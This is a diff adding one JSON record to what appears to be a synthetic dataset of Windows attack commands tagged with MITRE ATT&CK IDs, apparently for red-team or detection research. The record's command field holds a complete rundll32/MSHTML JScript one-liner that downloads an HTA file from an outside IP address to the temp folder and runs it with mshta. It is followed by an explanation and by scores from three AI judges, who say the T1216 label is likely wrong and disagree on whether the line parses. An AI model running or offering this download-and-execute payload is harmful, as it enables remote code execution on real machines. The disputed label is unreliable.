@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";var x=new ActiveXObject(\"MSXML2.XMLHTTP\");x.open(\"GET\",\"https://203.0.113.20/drop.hta\",false);x.send();var s=new ActiveXObject(\"ADODB.Stream\");s.Type=1;s.Open();s.Write(x.responseBody);var fso=new ActiveXObject(\"Scripting.FileSystemObject\");var f=fso.GetSpecialFolder(2)+\"\\\\drop.hta\";s.SaveToFile(f,2);new ActiveXObject(\"WScript.Shell\").Run(\"mshta \"+f)",
+  "explanation": "Invokes MSHTML via rundll32 as a script proxy to download an HTA to the temp directory and execute it with mshta, remaining within user privileges and native tooling.",
+  "rationale_steps": [
+    "Launch MSHTML RunHTMLApplication with rundll32 from PowerShell.",
+    "In JScript, use XMLHTTP and ADODB.Stream to download and save remote content to %TEMP%.",
+    "Execute the saved HTA with mshta; defenders should watch for ADODB/Stream usage inside rundll32/MSHTML contexts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-d5de4454",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rundll32 javascript: mshtml invocation with balanced quotes and valid JScript statements; no parsing errors apparent.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly proxies execution via MSHTML to download to Temp and launch with mshta using native tooling and user-level context, but HTTPS to a raw IP may fail due to certificate mismatch and the unquoted path could break if it contains spaces, and the approach aligns more with signed binary proxy execution than T1216\u2019s typical signed script proxies.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T21:38:23.878020Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced quotes and valid JavaScript embedded in the rundll32 invocation, though the escaped backslash prefix `\"\\..\\mshtml` and mixed quoting within the JavaScript string could cause parsing issues in some shell contexts.",
+        "semantic_score": 3,
+        "semantic_justification": "While the rundll32+MSHTML JavaScript trick is a real LOLBin technique (closer to T1218.011 than T1216), the command plausibly downloads and executes an HTA via native tooling, but it is misattributed to T1216 (signed script proxy execution via VBS scripts like PubPrn.vbs) rather than the more accurate T1218.011 (Signed Binary Proxy Execution: Rundll32), reducing semantic alignment with the stated technique.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T00:05:34.393838Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 2,
+        "syntactic_justification": "In PowerShell, the unquoted semicolons act as command separators, and the unescaped double quotes will be improperly parsed, causing the shell to terminate the rundll32 command prematurely and attempt to execute the JavaScript 'var' statements as PowerShell commands.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logic is a well-known 'Squiblytwo' style execution bypass that effectively downloads and executes a payload; however, it is more accurately categorized under MITRE ATT&CK T1218.011 (Rundll32) rather than T1216 (System Script Proxy Execution), which typically involves signed script files like .vbs or .js.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:06:16.220481Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
